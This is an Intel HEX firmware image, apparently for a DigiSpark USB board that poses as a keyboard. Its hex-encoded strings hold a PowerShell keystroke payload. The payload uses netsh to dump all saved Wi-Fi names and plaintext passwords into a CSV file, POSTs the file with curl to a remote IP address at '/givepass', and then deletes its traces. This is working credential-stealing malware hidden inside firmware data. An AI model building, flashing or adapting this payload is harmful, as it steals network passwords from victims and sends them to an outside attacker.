:1000000039C15DC137C45BC1BFC359C158C157C1F4
:1000100056C155C154C153C152C151C150C12C5ECA
:100020007460616264346667656E362D3738271EEA
:100030001F202122232425267333762E77785F44D0
:1000400045464748494A4B4C4D4E4F5051525354E8
:1000500055565758595A5B5C5D2F3130636D3504E6
:1000600005060708090A0B0C0D0E0F1011121314C8
:1000700015161718191A1B1C1D6F7170752A0501AA
:100080000906A101050719E029E7150025017501F9
:10009000950881029501750825731900297381005F
:1000A000C0100344006900670069004B00650079D7
:1000B000001C036400690067006900730074007528
:1000C000006D0070002E0063006F006D00040309D6
:1000D000040902220001010080320904000001032A
:1000E000010100092101010001222300070581030C
:1000F00008000A1201100100000008C016DB2700EA
:1001000001010200010038010101010101010204A5
:10011000081020286E6574736820776C616E2073F8
:10012000686F772070726F66696C657329207C2018
:1001300053656C6563742D537472696E6720275C18
:100140003A282E2B292427207C20257B246E616DC4
:10015000653D245F2E4D6174636865732E47726F31
:100160007570735B315D2E56616C75652E547269C6
:100170006D28293B20245F7D207C20257B286E650F
:1001800074736820776C616E2073686F772070726B
:100190006F66696C65206E616D653D246E616D658D
:1001A000206B65793D636C656172297D20207C2020
:1001B00053656C6563742D537472696E6720274BA9
:1001C000657920436F6E74656E745C572B5C3A28BA
:1001D0002E2B292427207C20257B24706173733DDE
:1001E000245F2E4D6174636865732E47726F75705E
:1001F000735B315D2E56616C75652E5472696D2886
:10020000293B20245F7D207C20257B5B5053437558
:1002100073746F6D4F626A6563745D407B205052EA
:100220004F46494C455F4E414D453D246E616D65DD
:100230003B50415353574F52443D247061737320D8
:100240007D7D207C204578706F72742D43737620FD
:100250002D506174682024656E763A7573657270EE
:10026000726F66696C655C74656D702E6373763B46
:100270000000D90511241FBECFE5D2E0DEBFCDBFFF
:1002800021E0A6E4B1E001C01D92AE38B207E1F76B
:1002900011E0A0E6B0E0E0E1FCE002C005900D92C4
:1002A000A634B107D9F711E0CAE3D1E003C0219722
:1002B000FE01A6D4C933D107D1F7FDD3A7C4A0CE80
:1002C000EEE0F1E09491E8E0F1E0E491EE2391F0CA
:1002D0002AB52F7C2ABDF0E0EB5FFE4FA491B0E081
:1002E000811109C08FB7F8942C91E92FE095E22392
:1002F000EC938FBF08958FB7F894EC91E92BF8CF6A
:10030000CF92DF92EF92FF920F931F93CF93DF93E1
:100310006C01EB017B01E40EF51E10E000E0CE1550
:10032000DF0561F06991D601ED91FC910190F081BA
:10033000E02DC6010995080F191FF1CFC801DF9103
:10034000CF911F910F91FF90EF90DF90CF90089584
:10035000FC018091660184FF14C09091670188E8D8
:1003600098279093670180818093680181818093B1
:10037000690162E088E691E066D286E080936601DA
:1003800008958AE580936601EECFFC01019000207C
:10039000E9F73197AF01481B590BBC0184E591E0A7
:1003A000AFCFCF92DF92EF92FF920F931F93CF9335
:1003B000DF9380917501835087FD2CC0909173016C
:1003C0009D3231F5883021F580917401ECE0F0E048
:1003D000E81BF109E858FE4F83EC80935B018AE546
:1003E00080936100109247018081807609F494C067
:1003F00089E591E0909349018093480180E09781DD
:10040000911104C09681981708F4892F8093600099
:10041000109275018091610084FF3CC08091600062
:100420008F3FC1F1C82F893008F0C8E0982F9C1B7E
:100430009093600090915B0128E8922790935B0174
:100440008823E1F040914801509149018091470192
:1004500086FFDFC0ACE5B1E0FA019C2F84918D935B
:1004600031969150D9F72FEF2C0F30E02F5F3F4F8F
:10047000240F351F30934901209348016C2F8CE5E0
:1004800091E0E1D1CC5FCC3019F08FEF8093600028
:10049000C093610084E196B3987131F48150D9F72B
:1004A0001092760110927201DD24D3948111D12C27
:1004B00090914A01D91639F1882319F1F89408E08E
:1004C00010E0C0E0D0E8CD2ECC0EC1BEC0D17C0182
:1004D0008CEEE81688E0F8060CF4CC2DD695015089
:1004E000110989F78FEF8C0F81BF0C2F10E00F5F80
:1004F0001F4F81B78017110609F00CF493C0C1BFDC
:100500007894D0924A01DF91CF911F910F91FF9083
:10051000EF90DF90CF900895228110926401918135
:1005200091110AC01092650124E631E082E0309317
:1005300049012093480163CF953029F42093760137
:1005400024E631E0F4CF963009F04CC0938191302D
:1005500059F483EF90E0909349018093480182E140
:1005600090E4909347014BCF923041F481ED90E0BD
:10057000909349018093480182E2F2CF9330F1F4E5
:10058000211108C08DEC90E09093490180934801BF
:1005900084E0E6CF213041F481EB90E09093490173
:1005A000809348018CE1DCCF2230D1F681EA90E0E3
:1005B000909349018093480180E1D2CF913241F478
:1005C00083EE90E0909349018093480189E0C8CF81
:1005D000923231F68EE790E0909349018093480182
:1005E00083E2BECF983071F0993019F42093460120
:1005F000A7CF9A3059F09B3009F0A2CF9BE490939B
:1006000067019ECF26E431E081E091CF24E631E01E
:10061000FBCFDA01ECE5F1E09C2F8D9181939150B5
:10062000E1F721CF14D18C5E984097FF03C09195DC
:10063000819591098E159F0514F4C1B77C0181B78E
:100640008F5F81BF56CF8F929F92AF92BF92CF9212
:10065000DF92EF92FF926B017C012FB7F8948091AB
:10066000500190915101A0915201B09153012FBFBF
:100670002FB7F8948090500190905101A0905201B2
:10068000B09053012FBFC818D908EA08FB08C80E5C
:10069000D91EEA1EFB1E85DED501C4011C141D04F3
:1006A0001E041F042CF3FF90EF90DF90CF90BF90BB
:1006B000AF909F908F9008950F931F93CF93DF93E8
:1006C000EC01162F042F8091660184FD08C069DEBD
:1006D0008FE19EE40197F1F700C00000F4CF0D8395
:1006E0001E83CE010596DF91CF911F910F9130CEE1
:1006F000FF920F931F93CF93DF936830C9F0693057
:10070000A9F16A30A9F16D3099F1603248F0262FD5
:100710002052330BF901E25EFF4FC491C11109C0B1
:1007200081E090E0DF91CF911F910F91FF900895AC
:10073000CAE2FC01F480D2E0C6FFD0E0C7FDD0647D
:10074000CF73CF3309F4C4E68C01FF2011F081E0B0
:10075000B7DD4D2F6C2FC801AFDF40E060E0C8016E
:10076000ABDFFF20E9F280E0ABDDDACFCBE2E1CF17
:10077000C8E2DFCF40E0682F84E591E09DDF40E0F4
:1007800060E084E591E098CF1F920F920FB60F9230
:1007900011242F933F938F939F93AF93BF93809197
:1007A000500190915101A0915201B09153013091AB
:1007B0004F0123E0230F2D3768F126E8230F02961F
:1007C000A11DB11D20934F018093500190935101C1
:1007D000A0935201B093530180914B0190914C0131
:1007E000A0914D01B0914E010196A11DB11D8093C4
:1007F0004B0190934C01A0934D01B0934E01BF91DA
:10080000AF919F918F913F912F910F900FBE0F90BD
:100810001F9018950196A11DB11DD4CFA82FB92FF7
:1008200080E090E041E050EA609530E009C02D9111
:1008300082279795879510F084279527305EC8F317
:100840006F5FA8F30895EADF8D939D930895A6E066
:1008500088279927AA9569F00197E1F3B399FCCF0E
:10086000B39BFECF81E09927A6B3019611F0A87142
:10087000D9F70895CF93CFB7CF93DF93C395B39BA9
:10088000E9F7B39B0BC0B39B09C0B39B07C0B39BF5
:1008900005C0B39B03C0B39B01C08BC06F93C091D5
:1008A0007401DD27C858DE4F2F9365E5B39B03C065
:1008B0002F916F91E6CF0F931F934F9320E040E16C
:1008C0005F9306B3087103FB27F93F9350E03BE0C9
:1008D00039C0187140642F77012F5F5F1EC04068D8
:1008E00016B318712F7752501FC0406406B32F778C
:1008F0000871D1F15F5F00C023C0406216B32F774B
:10090000187191F15F5F00C025C008711027515028
:1009100012F45D5F0000115027952C3F16B3C8F606
:1009200018710127015027952C3FC8F6422749939B
:1009300006B3087110274F73115027952C3FA8F666
:100940004695469516B3187179F001270150279501
:100950002C3F98F66B5A60F3315006B3B0F600C0E6
:1009600010E21ABF002719C03B503195C31BD0407D
:1009700010E21ABF0881033C09F10B34F9F0209111
:1009800072011981110F1213EDCF4A81441F0936EC
:1009900051F10D3211F0013E29F7009377013F919B
:1009A0005F914F911F910F912F916F91CAB7C5FD24
:1009B00065CFDF91CF91CFBFCF911895209177016F
:1009C000222369F310917501112391F5343092F1CE
:1009D0003093750120937301109174013BE0311B3A
:1009E0003093740127C00091750101300CF50AE5C0
:1009F0004F7049F43091610034FD1DC000936100D7
:100A0000CBE5D1E01CC03091660134FD14C00093E9
:100A10006601C7E6D1E013C0052710E000C0000062
:100A200008BB1AC0052710E0221F1DC010E021C01E
:100A30004AE502C032ED432FC4E1D0E032E017B303
:100A40001861C39A08B317BB58E120E865E320FF9B
:100A5000052708BB279517951C3FF0F66695B8F754
:100A6000B1F720FF052708BB279517951C3FD0F647
:100A70002795179517FF052700001C3F08BBB0F608
:100A800029913A9519F7077E10917601110FC651F9
:100A9000D04008BB11F01093720110E21ABF086039
:100AA00017B3177E402F477E54E05A95F1F708BBE5
:100AB00017BB48BB74CF81E2E1E0F0E080935700C0
:100AC000849181BF789480B7806880BF80B780644C
:100AD00080BF8CB580648CBD8FEF8DBD80B7807F6B
:100AE000876080BF89B7846089BF83B7887F83BFF1
:100AF0008AB58C7F81608ABD83B7877F83BF83B7C8
:100B0000887F836083BF86B1876086B9379A80E02B
:100B100031DE64EF71E080E090E095DD48E065E172
:100B200084E591E0C9DD40E060E084E591E0C4DD6A
:100B300064EF71E080E090E086DD8AE690E025DCFD
:100B400088E218DE68EE73E080E090E07CDDC3E1CF
:100B5000D1E0FE016491662331F084E591E0C8DDC7
:100B60002196892BB1F788E205DE68EE73E080E01C
:100B700090E069DD82E890E008DC88E2FBDD89ED49
:100B800090E003DC88E2F6DD83E091E0FEDB88E2C2
:100B9000F1DD68EE73E080E090E055DD8CE191E0FE
:100BA000F4DB88E2E7DD80E491E0EFDB88E2E2DD80
:100BB000FFCFE4E5F1E01382128286E690E09183B4
:100BC00080831482F894BB9A2FEF84E39CE0215039
:100BD00080409040E1F700C00000BB98AC9A8BB712
:100BE00080628BBFE6E6F1E08BE481838AE5808357
:100BF000789410925A011092590189E591E0A8CB9E
:100C0000EE0FFF1F0590F491E02D0994F894FFCFAB
:100C1000FF5A0000000078038001706F77657273DF
:100C200068656C6C202D65786563206279706173EE
:100C30007300244375726C417267756D656E742024
:100C40003D20272D58272C2027504F5354272C2048
:100C5000272D64272C20274074656D702E637376D2
:100C6000272C2027687474703A2F2F3232302E329E
:100C700034352E3135302E3134303A3434332F6719
:100C8000697665706173732700244375726C4558EB
:100C900045203D2027433A2F57696E646F77732FA5
:100CA00053797374656D33322F6375726C2E65786A
:100CB0006527002620244375726C45584520404323
:100CC00075726C417267756D656E7400726920246F
:100CD000656E763A7573657270726F66696C655C85
:100CE00074656D702E637376202D666F7263650078
:060CF00065786974000044
:00000001FF
